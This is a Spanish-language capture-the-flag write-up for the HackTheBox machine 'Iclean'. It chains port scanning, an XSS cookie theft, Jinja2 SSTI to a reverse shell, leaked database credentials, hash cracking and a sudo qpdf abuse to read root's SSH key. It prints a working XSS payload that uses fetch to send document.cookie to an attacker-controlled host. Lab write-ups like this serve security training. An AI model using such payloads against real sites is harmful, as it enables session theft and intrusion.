<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Iclean</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Iclean</h1><br/><p><ol><li>Realizo un escaneo de puertos <strong>nmap 10.10.11.12 -sS -T4 -A -p- -oN scan.txt</strong></li><li>Encuentro los  servicios ssh(22) y http(80)</li><li>Añado el Domain name a mi lista de<strong> /etc/hosts</strong> </li></ol><img src="images/84-1.png" alt="images/84-1.png" /><ol><li>Uso ffuf para encontrar endpoints interesantes<strong> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u </strong><strong><a href="http://capiclean.htb/FUZZ">http://capiclean.htb/FUZZ</a></strong><strong> -fc 404</strong> </li></ol><img src="images/84-2.png" alt="images/84-2.png" /><ol><li>A través de <a href="http://capiclean.htb/quote">http://capiclean.htb/quote</a> puede que me deje ejecutar  un XSS.</li><li>Intercepto la respuesta con Burpsuite </li></ol><img src="images/84-3.png" alt="images/84-3.png" /><ol><li>Veo que el parametro service es vulnerable a<strong> XSS</strong> </li></ol><img src="images/84-4.png" alt="images/84-4.png" /><ol><li>Uso este código dentro de service para obtener la cookie <strong>  &lt;img src=x onerror=fetch(&quot;http://&lt;IP&gt;:&lt;PORT&gt;/&quot;+document.cookie);&gt;</strong></li><li>Para que lo pille bien tendré que codificarlo en base64</li><li>Al introducirlo obtengo la cookie <strong>&quot;GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZkpGCg.Uxy5EDul_e-QG6dvNx-kwNyhzBo HTTP/1.1&quot;</strong></li><li>Probablemente tengamos que usar esta cookie para bypassear un login </li></ol><img src="images/84-5.png" alt="images/84-5.png" /><ol><li>Al no encontrar donde añadir la cookie lo hago a través de la extensión cookie editor </li></ol><img src="images/84-6.png" alt="images/84-6.png" /><ol><li>Luego si la añadimos podremos acceder al dashboard como administrador  <a href="http://capiclean.htb/dashboard">http://capiclean.htb/dashboard</a></li><li>Generamos un invoice ID </li></ol><img src="images/84-7.png" alt="images/84-7.png" /><ol><li>Y en generar el QR introducimos ese ID </li></ol><img src="images/84-8.png" alt="images/84-8.png" /><ol><li>Después de crearlo me da un enlace  </li></ol><img src="images/84-9.png" alt="images/84-9.png" /><ol><li>Pongo el link del QR y me da una factura </li></ol><img src="images/84-10.png" alt="images/84-10.png" /><ol><li>Intercepto la solicitud <strong>POST</strong> al darle al botón submit </li></ol><img src="images/84-11.png" alt="images/84-11.png" /><ol><li>Creo que /QRGenerator es vulnerable a SSTI por que usa Flask, al ser un marco de trabajo que utiliza Jinja como motor de plantillas, es vulnerable a este tipo de ataques si no se maneja correctamente </li></ol><img src="images/84-12.png" alt="images/84-12.png" /><ol><li></li></ol><img src="images/84-13.png" alt="images/84-13.png" /><ol><li>Me devuelve el código 49 por lo que si que es vulnerable a SSTI.</li><li>Uso este SSTI <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------">https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------</a></li><li>La parte del payload para obtener el reverse la codifico en<strong> url encoded</strong> y obtengo el reverse en mi netcat como <strong>www-data</strong> </li></ol><img src="images/84-14.png" alt="images/84-14.png" /><ol><li>Después de hacer un poco de footprint encuentro que <strong>app.py</strong> leekea las credenciales de la db </li></ol><img src="images/84-15.png" alt="images/84-15.png" /><ol><li>Me conectro a mysql  <strong>mysql -u &lt;user&gt; -p &lt;password&gt;</strong></li><li>Encuentro los hashes de consuela y de Administrator. El hash que me interesa el el de consuela ya que en home es el unico usuario que encontramos.  Probablemente sea el usuario que usaremos para escalar privilegios.</li><li>El hash lo crackeo en crackstation y accedo a este usuario a través de ssh </li></ol><img src="images/84-16.png" alt="images/84-16.png" /><ol><li>Ejecuto <strong>sudo -l</strong> y veo que puedo ejecutar el comando <strong>/usr/bin/qpdf</strong> como root </li><li>Con el comando puedo copiar el archivo id_rsa de root en mi carpeta tmp </li></ol><img src="images/84-17.png" alt="images/84-17.png" /><ol><li></li></ol><img src="images/84-18.png" alt="images/84-18.png" /><ol><li>Accedo a través de ssh con el usuario root. Si no me deja coger el id_rsa hay que cambiarle los privilegios al archivo. </li></ol><img src="images/84-19.png" alt="images/84-19.png" /></p></div>
</body>
</html>
